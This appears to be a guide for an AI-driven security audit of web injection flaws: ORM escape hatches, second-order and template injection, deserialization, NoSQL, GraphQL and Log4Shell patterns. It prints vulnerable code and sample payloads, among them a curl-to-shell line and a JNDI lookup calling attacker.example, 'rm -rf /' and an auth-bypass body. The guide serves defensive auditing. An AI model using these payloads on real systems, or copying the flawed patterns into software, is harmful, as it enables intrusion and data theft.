---
description: ORM bypass, second-order injection, template injection, deserialization in web contexts, NoSQL injection
languages: Python, JS, Java, Ruby
---

# Web Application Injection — ORM Bypass, Template Escape, and Deserialization in Frameworks

> Target: Injection bugs that survive SAST because the ORM/framework provides a safe API surface,
> but specific methods interpolate, or data crosses context boundaries through storage. The ORM
> query is "correct" — the injection is in the escape hatch method, the template rendering path,
> or the deserialization layer that the framework exposes for advanced use cases.

---

## Baseline Patterns (Single-Function / Single-Scope)

Toolchain-catchable patterns. Record as findings if encountered during orientation —
on unaudited codebases these are real, exploitable bugs that no prior tool run has caught.
Invest primary analysis time in the LLM-advantage patterns below.

- Direct string concatenation in SQL: `"SELECT * FROM users WHERE id=" + user_input`
- `eval(user_input)` direct usage
- `os.system(user_input)` direct usage
- `innerHTML = user_input` without sanitization
- Direct `pickle.loads(request.body)` in obvious request handler

---

## What You're Hunting (LLM-Advantage Patterns)

### 1. ORM Bypass Methods

Framework's ORM is parameterized by default, but specific methods interpolate. Developers
reach for these "escape hatches" when the ORM doesn't support their query shape.

```python
# Django — safe:
User.objects.filter(name=user_input)

# Django — unsafe ORM escape hatches:
User.objects.extra(where=[f"name = '{user_input}'"])       # .extra() interpolates
User.objects.raw(f"SELECT * FROM users WHERE name = '{user_input}'")  # .raw() with f-string
User.objects.order_by(user_input)                          # order_by accepts raw column names
                                                           # user_input = "-password" → sorts by password
                                                           # user_input = "name; DROP TABLE--" on some backends
RawSQL(f"UPPER({user_input})", [])                         # RawSQL with f-string
Func(function=user_input, template='%(function)s(name)')   # Func with user-controlled function name
```

```python
# SQLAlchemy — safe:
session.query(User).filter(User.name == user_input)

# SQLAlchemy — unsafe:
session.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))  # text() with f-string
session.query(User).filter(text(user_input))               # user controls entire WHERE clause
column(user_input)                                          # user controls column selection
```

```javascript
// Sequelize — safe:
User.findAll({ where: { name: userInput } });

// Sequelize — unsafe:
User.findAll({ where: sequelize.literal(`name = '${userInput}'`) });  // .literal() interpolates
User.findAll({ order: [[sequelize.literal(userInput), 'ASC']] });     // order with literal
// Older Sequelize (< v5): $-prefixed operators in where clause
User.findAll({ where: { name: { $ne: null } } });  // operator injection if userInput is object
```

```java
// Hibernate — safe:
session.createQuery("FROM User WHERE name = :name").setParameter("name", userInput);

// Hibernate — unsafe:
session.createQuery("FROM User WHERE name = '" + userInput + "'");    // HQL concatenation
session.createNativeQuery("SELECT * FROM users WHERE name = '" + userInput + "'");
// Criteria API with user-controlled property names:
cb.equal(root.get(userInput), value);  // user controls which column is queried
```

```ruby
# ActiveRecord — safe:
User.where(name: params[:name])

# ActiveRecord — unsafe:
User.where("name = '#{params[:name]}'")           # string interpolation in where
User.order(params[:sort])                          # user controls ORDER BY clause
User.pluck(params[:field])                         # user controls selected column
User.calculate(:sum, params[:column])              # user controls aggregated column
```

### 2. Second-Order Injection

Data stored safely via ORM, retrieved later, used unsafely in a different context.
The taint is "laundered" through the database.

```python
# Step 1: User registers with crafted name (stored safely via ORM)
User.objects.create(username="admin'--", email="attacker@evil.example")
# INSERT INTO users (username) VALUES ('admin''--')  ← properly escaped

# Step 2: Admin reporting script uses stored value unsafely
def generate_report(username):
    query = f"SELECT * FROM audit_log WHERE actor = '{username}'"
    cursor.execute(query)  # ← second-order SQL injection

# Step 3: Same data used in shell command
def export_user_data(username):
    subprocess.run(f"tar czf /backups/{username}.tar.gz /data/{username}/", shell=True)
    # username = "admin'; rm -rf /; '" → command injection

# Step 4: Same data used in email template
def send_welcome(user):
    template = f"Hello {user.username}, welcome!"
    # If rendered through a template engine: SSTI via stored username
```

### 3. Template Engine Injection (SSTI)

User data passed to template rendering instead of template variables.

```python
# Jinja2 — safe:
render_template("page.html", name=user_input)   # user_input is a variable, not a template

# Jinja2 — unsafe:
render_template_string(user_input)               # user_input IS the template
render_template_string(f"Hello {user_input}")    # user_input = "{{config}}" → leaks config
# If user controls template name — constrained by Jinja2's FileSystemLoader,
# but misconfigured loaders or symlinks may allow traversal:
render_template(user_input)                      # user_input = "../secret/internal.html"
```

```javascript
// Pug/Jade — code execution via interpolation
const pug = require('pug');
const html = pug.render(`p= ${userInput}`);  // if userInput is pug code → RCE
// Even with compile:
const fn = pug.compile(userInput);  // user controls template → arbitrary code
```

```ruby
# ERB — safe:
ERB.new(template).result_with_hash(name: user_input)

# ERB — unsafe:
ERB.new(user_input).result          # user controls template → RCE
# Also: raw() bypasses auto-escaping
"<div>#{raw user_input}</div>"      # XSS via raw()
```

```java
// Thymeleaf — SSTI via fragment expression
// If user input reaches a fragment selector:
// __${user_input}__ → preprocessed before template resolution
// user_input = "T(java.lang.Runtime).getRuntime().exec('...')"
@GetMapping("/page")
public String page(@RequestParam String section) {
    return "page :: " + section;  // fragment expression injection
}
```

### 4. Command Injection Through Framework Wrappers

Input "validated" by the framework for the web context but not for shell metacharacters.

```python
# Framework validates input is a valid filename, but not for shell safety
def download_report(request):
    filename = request.GET['file']  # framework validates: alphanumeric + extension
    # But allows: "report.pdf; cat /etc/passwd"
    subprocess.run(f"wkhtmltopdf /reports/{filename} /tmp/output.pdf", shell=True)

# Even subprocess with list form can be vulnerable:
subprocess.run(["git", "log", f"--author={user_input}"])
# user_input = "--exec=id" → git argument injection (not shell injection)
```

```javascript
// child_process.exec with template strings
const { exec } = require('child_process');
exec(`convert ${req.file.path} -resize ${req.query.size} output.png`);
// size = "100x100; curl attacker.example/shell.sh | sh" → command injection

// Even execFile is vulnerable to argument injection:
execFile('git', ['log', `--author=${userInput}`]);
// userInput = "--exec=id" → git executes arbitrary command via --exec
```

### 5. Deserialization in Web Contexts

Deserialization hidden behind framework abstractions — cache backends, message queues,
session storage, file upload processing.

```python
# Django cache backend with pickle (default for memcached/redis)
from django.core.cache import cache
data = cache.get('user_prefs')  # cache.get() calls pickle.loads() internally
# If attacker can poison the cache (cache key injection, shared cache), → RCE

# Celery task arguments
@app.task
def process(data):
    obj = pickle.loads(data)  # task receives serialized data from message queue
    # If attacker can submit jobs to the queue → RCE

# yaml.load in config parsing
config = yaml.load(uploaded_file.read(), Loader=yaml.FullLoader)
# FullLoader had bypass CVEs pre-PyYAML 5.4 (CVE-2020-1747); prefer SafeLoader.
# yaml.UnsafeLoader / yaml.Loader allow arbitrary Python objects → RCE
```

```java
// Java ObjectInputStream in request body handler
@PostMapping("/import")
public void importData(@RequestBody byte[] data) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject();  // deserialization → RCE via gadget chains
}

// Spring Redis session store — sessions serialized with Java serialization by default
// If attacker can inject a crafted session → RCE when session is deserialized
```

```php
// PHP unserialize from cookie or hidden form field
$prefs = unserialize($_COOKIE['user_prefs']);  // arbitrary object instantiation
// Even with allowed_classes restriction, destructor chains can still execute
$prefs = unserialize($data, ['allowed_classes' => ['UserPrefs']]);
// If UserPrefs.__destruct() writes to a file → file write primitive
```

### 6. NoSQL Operator Injection

Query operator injection through JSON request bodies or nested object parsing.

```javascript
// MongoDB via Mongoose — safe when input is a string:
User.findOne({ username: "admin" });

// Unsafe when input is an object (Express parses JSON bodies):
// POST body: {"username": {"$ne": ""}, "password": {"$ne": ""}}
User.findOne({ username: req.body.username, password: req.body.password });
// Matches any user where username != "" AND password != "" → auth bypass

// Also: $regex operator injection
// POST body: {"username": {"$regex": "^admin"}}
User.findOne({ username: req.body.username });  // regex-based data extraction

// $where operator — JavaScript execution on server:
User.findOne({ $where: req.body.query });  // arbitrary JS execution in MongoDB
```

```python
# PyMongo with user-controlled operators
result = db.users.find_one({"username": request.json["username"]})
# If request body is {"username": {"$gt": ""}}, matches all users
# Fix: validate that username is a string, not a dict
```

### 7. GraphQL Resolver Injection

GraphQL resolvers pass user arguments directly to database queries.

```javascript
// Resolver passes args to raw query
const resolvers = {
    Query: {
        user: async (_, { id }) => {
            // Safe: parameterized
            return db.query('SELECT * FROM users WHERE id = $1', [id]);
        },
        search: async (_, { term, sortBy }) => {
            // Unsafe: sortBy interpolated
            return db.query(`SELECT * FROM users WHERE name LIKE '%${term}%' ORDER BY ${sortBy}`);
        }
    }
};

// Nested resolver with batched queries — N+1 optimization introduces injection
const resolvers = {
    User: {
        orders: async (parent) => {
            // parent.id comes from database, trusted? Only if the parent resolver
            // didn't interpolate attacker data into the id field
            return db.query(`SELECT * FROM orders WHERE user_id = ${parent.id}`);
        }
    }
};
```

### 8. Log Injection and Log4Shell Variants

User input in log statements enables log forging, ANSI escape injection, or JNDI lookups.

```python
# Log forging — fake log entries
logger.info(f"Login attempt: user={username} result=success")
# username = "admin result=success\n2024-01-01 Login attempt: user=attacker"
# → Creates fake log entry showing successful admin login

# ANSI escape injection in terminal-rendered logs
logger.info(f"Request from: {user_agent}")
# user_agent = "\033[2J\033[H" → clears terminal when log is tailed
```

```java
// Log4j JNDI lookup (Log4Shell pattern)
logger.info("User-Agent: " + request.getHeader("User-Agent"));
// User-Agent: ${jndi:ldap://attacker.example/exploit}
// Log4j < 2.17 resolves the JNDI lookup → RCE

// Even after Log4Shell patches, other lookup patterns:
// ${env:AWS_SECRET_ACCESS_KEY} → environment variable leak via log messages
// ${sys:user.dir} → system property leak
```

---

## Python Specific

**Django ORM**:
- `.extra()` is deprecated but still functional — search for it in legacy code
- `.raw()` with f-strings or `.format()` — always injection
- `QuerySet.annotate()` with `RawSQL()` — if the SQL string includes user input
- `JSONField` lookups: `data__key` is safe, but `data__contains` with user-controlled JSON can be abused

**SQLAlchemy**:
- `text()` is the primary escape hatch — always check what's interpolated into it
- `func.` with user-controlled function names
- `Engine.execute(string)` — direct SQL string execution, bypasses ORM entirely

**Jinja2/Flask**:
- `render_template_string()` is the canonical SSTI vector
- `Markup()` marks content as safe — if user input is wrapped in `Markup()`, auto-escaping is bypassed
- Custom template filters that call `eval()` or `exec()`

## JavaScript Specific

**Express/Node**:
- `sequelize.literal()` and `sequelize.fn()` with user input
- `knex.raw()` with template strings
- `mongoose` with `$where`, `$regex`, or operator objects from parsed JSON bodies
- `ejs` template engine: `<%- include(userInput) %>` → LFI/RCE

**GraphQL (Apollo/Express-GraphQL)**:
- Custom scalars that don't validate — `GraphQLString` accepts any string including injection payloads
- Resolver arguments passed directly to `db.query()` without parameterization
- Introspection enabled in production — maps the entire schema for attacker reconnaissance

## Java Specific

**Hibernate/JPA**:
- `createQuery()` with string concatenation (HQL injection)
- `createNativeQuery()` with string concatenation (SQL injection)
- `CriteriaBuilder` with `Expression` from user input
- `@NamedQuery` is safe, but `@NamedNativeQuery` with `nativeQuery=true` needs scrutiny

**Spring**:
- `JdbcTemplate.queryForList(sql)` where `sql` includes user input
- Spring Data `@Query` annotation with SpEL: `#{#entityName}` is framework-controlled, but custom SpEL expressions can be injected
- Spring Expression Language (SpEL) injection: `parser.parseExpression(userInput).getValue()`

**Thymeleaf**:
- `__${...}__` preprocessing syntax evaluates before template rendering — if user controls the expression, it's SSTI
- `th:utext` outputs unescaped HTML (vs `th:text` which escapes)

---

## Detection Questions

1. **"Does the ORM method being called actually parameterize, or is it an escape hatch that interpolates?"**
   Check the specific method documentation. `.filter()` is safe, `.extra()` is not, `.raw()` depends on usage.
   The developer likely reached for the escape hatch because the ORM couldn't express their query.

2. **"Is stored data ever used in a different context than it was stored for?"**
   Trace data from database retrieval forward to all consumers. If data stored via ORM (SQL-safe) is later
   used in a shell command, template, or log statement — that's a context boundary crossing.

3. **"Can request body values be objects/arrays instead of scalar strings?"**
   Express parses JSON bodies into objects. If the application expects `username: "admin"` but receives
   `username: {"$ne": ""}`, MongoDB treats it as an operator. Check for type validation on all inputs.

4. **"Is user input ever passed to a template rendering function as the template itself (not as a variable)?"**
   `render_template("page.html", data=input)` is safe. `render_template_string(input)` is SSTI.
   Search for `render_template_string`, `pug.compile`, `ERB.new`, `Template(input)`.

5. **"Where does deserialization happen, and what format does it use?"**
   pickle, yaml.load, Java ObjectInputStream, and PHP unserialize are all RCE vectors. Search for these
   in cache backends, session stores, message queue consumers, and file upload handlers — not just in
   direct request handling.

---

## Real CVE Examples

### CVE-2023-34362 (MOVEit Transfer — SQL Injection via ORM Bypass)
MOVEit Transfer's web application used an ORM layer for most database operations, but certain
API endpoints constructed SQL queries using string interpolation when the ORM couldn't express
the query shape. The injection point was in a complex multi-table join with dynamic column
selection — exactly the pattern where developers reach for raw SQL. SAST tools focusing on
the ORM surface would have seen parameterized queries everywhere except in this escape hatch.
The vulnerability allowed unauthenticated access to the database and was exploited in the wild
by the Cl0p ransomware group.

### CVE-2021-44228 (Log4Shell — Log Injection to RCE)
Apache Log4j's message lookup feature resolved JNDI expressions embedded in log messages.
User-controlled data (HTTP headers, form fields, URL parameters) logged via `logger.info()`
or `logger.error()` could contain `${jndi:ldap://attacker.example/exploit}`, causing the server
to fetch and execute a remote Java class. SAST tools checking for SQL injection and command
injection completely missed this because logging is considered a safe sink. The vulnerability
class — log message interpretation — was not in any SAST rule set before this disclosure.

### CVE-2019-14234 (Django — JSONField Key Injection)
Django's `JSONField` key lookup via `__` syntax (e.g., `data__key=value`) was parameterized
for the value but not for the key path. An attacker who controlled the key name could inject
SQL into the JSON path expression used in the database query. The ORM's parameterization
covered the value side but the key traversal was interpolated into the SQL. SAST tools
that verified "all ORM queries are parameterized" missed this because the ORM method call
appeared safe — the injection was in how the ORM internally constructed the JSON path SQL.
